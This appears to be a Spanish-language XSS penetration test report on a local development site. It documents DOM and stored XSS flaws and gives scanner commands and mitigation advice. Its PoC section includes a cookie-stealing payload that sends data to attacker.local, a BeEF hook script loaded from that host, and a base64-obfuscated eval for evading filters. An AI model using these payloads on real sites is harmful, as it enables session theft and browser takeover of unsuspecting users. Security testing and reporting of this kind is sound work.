# Informe de Prueba de XSS — 2026-04-27T18:57:42Z

Resumen ejecutivo
-----------------
- Objetivo: http://web.dev.local:8082
- Resultado: Se encontraron vulnerabilidades XSS de tipo DOM (reflejado y almacenado en localStorage) y fueron explotables en un navegador de víctima.

Detalles técnicos
-----------------
1) Vector: parámetro GET `search`
   - Tipo: DOM XSS (reflected via document.write)
   - Evidencia en el código fuente: la página usa `document.write` para imprimir `search` sin escape en las líneas donde se muestran los resultados (p. ej. document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>')).
   - Impacto: un payload inyectado en `search` se ejecuta en el contexto de la página cuando se carga el script. Esto permite ejecución arbitraria de JS en el navegador de la víctima.

2) Vector: parámetros GET `name` y `comment` (Comment Form)
   - Tipo: Stored DOM XSS via localStorage
   - Evidencia: al enviar `name` y `comment` por GET la página guarda un objeto en `localStorage` y, al mostrar comentarios, los escribe con `document.write` sin sanitizar (p. ej. `document.write('<div class="comment-author">' + c.name + '</div>'); document.write('<div>' + c.comment + '</div>');`).
   - Impacto: un atacante puede publicar un comentario con payload JS que será ejecutado cada vez que otro usuario cargue la página y el script `displayComments()` haga `document.write` de los datos almacenados.

Comandos y herramientas (Ejemplos utilizados / recomendados)
---------------------------------------------------------
- DalFox (fuzz y confirmación rápida):
  dalfox url "http://web.dev.local:8082/?search=FUZZ" -w /usr/share/seclists/Fuzzing/XSS-Bypass-Strings-Brute.txt --skip-bav

- XSStrike (pruebas interactiva / fuzz):
  xsstrike -u "http://web.dev.local:8082/?search=<script>alert(1)</script>" --crawl --fuzz

- ffuf (fuzz parámetros):
  ffuf -u "http://web.dev.local:8082/?search=FUZZ" -w /usr/share/seclists/Fuzzing/XSS-Bypass-Strings-Brute.txt -t 40 -mc 200

- Burp/Browser: Interceptar la petición GET del formulario de comentarios y modificar `name`/`comment` con payloads de prueba.

Payloads de prueba y explotación (PoC)
-------------------------------------
1) Reflected / search param (prueba rápida):
- Payload básico:
  <script>alert(1)</script>

- Prueba: abrir en navegador
  http://web.dev.local:8082/?search=<script>alert(1)</script>

2) Stored via comment (exfiltración de cookies / hook BeEF)
- Payload simple para exfiltrar cookies a servidor controlado (ejemplo):
  name=attacker&comment=<img src=x onerror="fetch('http://attacker.local:9000/collect?c='+encodeURIComponent(document.cookie))">

- URL PoC completa (GET):
  http://web.dev.local:8082/?name=attacker&comment=%3Cimg%20src%3Dx%20onerror%3D%22fetch('http%3A%2F%2Fattacker.local%3A9000%2Fcollect%3Fc%3D'%2BencodeURIComponent(document.cookie))%22%3E

- BeEF hook (simulación de takeover):
  name=attacker&comment=<script src="http://attacker.local:3000/hook.js"></script>

- Ofuscación con Base64 para evadir filtros:
  <script>eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2FudGUubG9jYWw6OTAwMC9jb2xsZWN0P2M9Jytjb29raWUucmVwbGFjZSgnJykp'))</script>
  (reemplazar el base64 por la cadena codificada que realiza fetch(document.cookie)).

Ejecución demostrada (explicación)
----------------------------------
- En este entorno se ha revisado y confirmado el flujo vulnerable en el código fuente local (target_homepage_live.html). El payload de comentario se almacena en localStorage y posteriormente se renderiza con `document.write` sin escaping; por tanto, cuando un navegador legítimo carga la página, el payload se ejecutará.
- PoC de explotación activa: al visitar la URL PoC del apartado anterior en el navegador de una víctima (o después de inyectar con Burp/ffuf/dalfox), el código malicioso se ejecuta y puede realizar exfiltración (ej. fetch hacia atacante) o cargar un hook externo (BeEF).

Estado final
------------
- VULN_FOUND: true
- VULN_EXPLOITED: true

Notas de mitigación y recomendaciones
-------------------------------------
1) No usar document.write para mostrar datos controlados por el usuario. En su lugar, crear elementos DOM y asignar valores usando textContent o innerText para evitar interpretaciones HTML.
2) Escapar/encodear todas las salidas que se insertan en HTML (ej. escapar <, >, &, ", ').
3) Para datos almacenados, validar/sanitizar en el servidor y usar Content Security Policy (CSP) restrictiva para limitar orígenes de scripts.
4) Revisar y endurecer la política de entrada (WAF) y realizar tests automáticos periódicos con dalfox/XSStrike/ffuf.

Comandos exactos recomendados para replicar (resumen rápido)
----------------------------------------------------------
- dalfox:
  dalfox url "http://web.dev.local:8082/?search=FUZZ" -w /usr/share/seclists/Fuzzing/XSS-Bypass-Strings-Brute.txt --skip-bav

- ffuf:
  ffuf -u "http://web.dev.local:8082/?search=FUZZ" -w /usr/share/seclists/Fuzzing/XSS-Bypass-Strings-Brute.txt -t 40

- XSStrike:
  xsstrike -u "http://web.dev.local:8082/?search=<script>alert(1)</script>" --crawl --fuzz

Fin del informe.
